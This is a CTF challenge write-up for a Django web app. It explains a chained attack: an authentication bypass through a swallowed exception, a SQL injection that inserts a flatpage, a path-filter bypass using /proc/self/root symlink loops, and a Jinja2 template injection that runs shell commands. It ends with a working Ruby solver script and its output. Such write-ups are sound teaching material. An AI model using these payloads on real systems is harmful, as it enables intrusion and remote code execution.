# Details

this challenge consists of 3 parts, first getting the admin, exploiting flatpages midleware using the SQL injection, and bypassing the upload filter. it got 0 solves during the CTF.

## getting the admin

for all the views in the app, i have enabled the rest framework default auth classes and also the app's custom ones, for instance:

```py
class SetHotOfExperienceView(APIView):
    authentication_classes = APIView.authentication_classes + [AdminAuthentication]
    permission_classes = [IsAuthenticated]

    ...
```

one of [`APIView.authentication_classes`](https://github.com/encode/django-rest-framework/blob/a8595a8eae2649b763f4882da643c1dc9183d6f1/rest_framework/settings.py#L40) is `rest_framework.authentication.BasicAuthentication` which is as the name implies a Basic Authentication class, rest framework authentication system tries all the defined `authentication_classes` of the view looking for a successful authentication as long as not class raises an exception:

```py
    # https://github.com/encode/django-rest-framework/blob/a8595a8eae2649b763f4882da643c1dc9183d6f1/rest_framework/request.py#L378C1-L395C34
    def _authenticate(self):
        """
        Attempt to authenticate the request using each authentication instance
        in turn.
        """
        for authenticator in self.authenticators:
            try:
                user_auth_tuple = authenticator.authenticate(self)
            except exceptions.APIException:
                self._not_authenticated()
                raise

            if user_auth_tuple is not None:
                self._authenticator = authenticator
                self.user, self.auth = user_auth_tuple
                return

        self._not_authenticated()
```

this is `authenticate` method of `AdminAuthentication`:
```py
class AdminAuthentication(BaseAuthentication):
    def authenticate(self, request):
        token = request.headers.get('Token')
        if not token:
            raise AuthenticationFailed('Authentication credentials were not provided.', code=401)
        
        try:
            token = token.split("Bearer ")[1]
            access_token = AccessToken(token)
            
            access_token.verify()
            
            user_id = access_token[api_settings.USER_ID_CLAIM]
            user = User.objects.get(id=user_id)
            
            if not user.is_admin:
                raise AuthenticationFailed(f'You are not an admin.', code=401)
            return (user, access_token)
        
        except TokenError as e:
            raise AuthenticationFailed(f'Invalid token: {str(e)}', code=401)
        except User.DoesNotExist:
            raise AuthenticationFailed('User not found.', code=404)
        except Exception as e:
            AuthenticationFailed('Authentication credentials were not provided.', code=401)
```

although i am intiating an `AuthenticationFailed` exception in the last `except` block i did not raise it, so any exception other than `TokenError` and `User.DoesNotExist` will be silently swallowed, looking at the code `token = token.split("Bearer ")[1]` could definitly raise a `IndexError` if the `Token` header does not contain `Bearer `. so to authenticate to the admin views this request would do the trick:

```HTTP
Token: asdf
Authorization: Basic b64(guest:guest)
```

or just this, since I forgot to invert the order of the authenticators and Basic auth would return succefully before hitting the `AdminAuthentication` :P
```HTTP
Authorization: Basic b64(guest:guest)
```

## SQL injection

the admin view `SetHotOfExperienceView` has a SQL injection that we can use after getting bypassing the `AdminAuthentication`.

```py
class SetHotOfExperienceView(APIView):
    authentication_classes = APIView.authentication_classes + [AdminAuthentication]
    permission_classes = [IsAuthenticated]

    def get(self, request, id, hot):
        print(f"UPDATE {Experience._meta.db_table} SET hot='{hot}' WHERE id = {id}")
        Experience.objects.raw(f"UPDATE {Experience._meta.db_table} SET hot='{hot}' WHERE id = %s", [id])._fetch_all()

        return Response({"message": "OK!"}, status=status.HTTP_200_OK)
```

the idea is to exploit the enabled `django.contrib.flatpages.middleware.FlatpageFallbackMiddleware`.

```py
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    "corsheaders.middleware.CorsMiddleware",
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.flatpages.middleware.FlatpageFallbackMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

from django site:

```
A flatpage is an object with a URL, title and content. Use it for one-off, special-case pages, such as “About” or “Privacy Policy” pages, that you want to store in a database but for which you don’t want to develop a custom Django application.
```

inspecting the flatpages table `django_flatpage` in the db:

```
db=# \d django_flatpage;
                                      Table "public.django_flatpage"
        Column         |          Type          | Collation | Nullable |             Default              
-----------------------+------------------------+-----------+----------+----------------------------------
 id                    | integer                |           | not null | generated by default as identity
 url                   | character varying(100) |           | not null | 
 title                 | character varying(200) |           | not null | 
 content               | text                   |           | not null | 
 enable_comments       | boolean                |           | not null | 
 template_name         | character varying(70)  |           | not null | 
 registration_required | boolean                |           | not null |
 ```

 and the `FlatpageFallbackMiddleware`:

 ```py
 # https://github.com/django/django/blob/e9ed9ec043bca1ac93660029e0fa0376e1320375/django/contrib/flatpages/views.py#L22
 def flatpage(request, url):
    """
    Public interface to the flat page view.

    Models: `flatpages.flatpages`
    Templates: Uses the template defined by the ``template_name`` field,
        or :template:`flatpages/default.html` if template_name is not defined.
    Context:
        flatpage
            `flatpages.flatpages` object
    """
    if not url.startswith("/"):
        url = "/" + url
    site_id = get_current_site(request).id
    try:
        f = get_object_or_404(FlatPage, url=url, sites=site_id)
    except Http404:
        if not url.endswith("/") and settings.APPEND_SLASH:
            url += "/"
            f = get_object_or_404(FlatPage, url=url, sites=site_id)
            return HttpResponsePermanentRedirect("%s/" % request.path)
        else:
            raise
    return render_flatpage(request, f)

@csrf_protect
def render_flatpage(request, f):
    """
    Internal interface to the flat page view.
    """
    # If registration is required for accessing this page, and the user isn't
    # logged in, redirect to the login page.
    if f.registration_required and not request.user.is_authenticated:
        from django.contrib.auth.views import redirect_to_login

        return redirect_to_login(request.path)
    if f.template_name:
        template = loader.select_template((f.template_name, DEFAULT_TEMPLATE))
    else:
        template = loader.get_template(DEFAULT_TEMPLATE)

    # To avoid having to always use the "|safe" filter in flatpage templates,
    # mark the title and content as already safe (since they are raw HTML
    # content in the first place).
    f.title = mark_safe(f.title)
    f.content = mark_safe(f.content)

    return HttpResponse(template.render({"flatpage": f}, request))
```

flatpages allows you to render any template in the django enabled apps under some url that normally returns HTTP 404 code. and this is where the file upload gadget comes to use.

## file upload:

```py
class AddWebFrameworkView(APIView):
    authentication_classes = APIView.authentication_classes + [AdminAuthentication]
    permission_classes = [IsAuthenticated]
    LOCATION = "/tmp"

    def post(self, request):
        data = request.data
        if all(isinstance(data[key], str) for key in ["filename", "content"]):
            filename = data["filename"]
            content = data["content"]
            if any(t in filename for t in ["../", "..", "\\", "//", "\\\\", ".py"]):
                return Response({'error': '?'}, status=status.HTTP_400_BAD_REQUEST)
            dir = os.path.dirname(filename)
            if os.path.exists(dir) and dir != AddWebFrameworkView.LOCATION:
                return Response({'error': '?'}, status=status.HTTP_400_BAD_REQUEST)
            with open(os.path.realpath(filename), "w") as f:
                f.write(content)
        return Response({'message': 'OK!'}, status=status.HTTP_201_CREATED)
```

`AddWebFrameworkView` allows a user with an admin to upload a file to `/tmp`. but the filter can be bypassed, `os.path.exists` returns `False` in case of an `ELOOP` error (`/usr/include/x86_64-linux-gnu/bits/param.h:#define      MAXSYMLINKS     20`). so `'/proc/self/root'*21 + '/dev/shm/file.txt'` would bypass the `/tmp` directory restriction.
```
>>> os.path.exists("/proc/self/root"*20+ "/etc/passwd")
True
>>> os.path.exists("/proc/self/root"*21+ "/etc/passwd")
False
```

last piece is where to write the template to, these are the enabled apps:
```py
INSTALLED_APPS = [
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'django.contrib.sites',
    'pipeline',
    'django.contrib.flatpages',
    "corsheaders",
    'rest_framework',
    'app'
]
```

only `pipeline` has a `jinja2` templates directory. so this is where we are going to write our template to.

```
web@3c73e82bb493:/app$ ls /home/web/.local/lib/python3.11/site-packages/{pipeline,corsheaders,rest_framework,django}/jinja2
ls: cannot access '/home/web/.local/lib/python3.11/site-packages/corsheaders/jinja2': No such file or directory
ls: cannot access '/home/web/.local/lib/python3.11/site-packages/rest_framework/jinja2': No such file or directory
ls: cannot access '/home/web/.local/lib/python3.11/site-packages/django/jinja2': No such file or directory
/home/web/.local/lib/python3.11/site-packages/pipeline/jinja2:
__init__.py  __pycache__  pipeline
web@3c73e82bb493:/app$
```

## [solver.rb](solver.rb):

```rb
require 'http'

puts HTTP.basic_auth(:user => "guest", :pass => "guest").headers(:Token => "asdf").post("http://10.25.1.156:8000/api/webframeworks/add", :json => {:filename => "#{"/proc/self/root"*21}/home/web/.local/lib/python3.11/site-packages/pipeline/jinja2/temp.html", :content => "AHA!  {%- for cls in ''.__class__.mro()[1].__subclasses__() -%} {%- if 'Popen' in cls.__name__ -%} {{ cls('cat /flag_*',shell=True,stdout=-1).communicate()[0].strip().decode() }} {%- endif -%} {%- endfor -%}"})

sql = "true'; WITH flatpage AS (INSERT INTO django_flatpage (url, title, content, enable_comments, template_name, registration_required) VALUES (convert_from(decode('2F3078343034', 'hex'), 'UTF8'), 'a', 'a', false, 'temp.html', false) RETURNING id), site AS (INSERT INTO django_site (domain, name) VALUES ('10.25.1.156:8000', 'web.akasec.club') ON CONFLICT (domain) DO UPDATE SET domain = django_site.domain RETURNING id) INSERT INTO django_flatpage_sites (flatpage_id, site_id) SELECT flatpage.id, site.id FROM flatpage, site;-- "

HTTP.basic_auth(:user => "guest", :pass => "guest").headers(:Token => "asdf").get("http://10.25.1.156:8000/api/experiences/setHot/12/#{sql}")
puts HTTP.get("http://10.25.1.156:8000#{%w{2F3078343034}.pack('H*')}")
```

```bash
+:~/CTF-Writeups/CyberOdyssey2024 Finals [Author]/WEB/WEBWEBWEB$ ruby solver.rb 
{"message":"OK!"}
AHA!ODYSSEY{|_+_WEB_WAB_WOB_+_|}
```
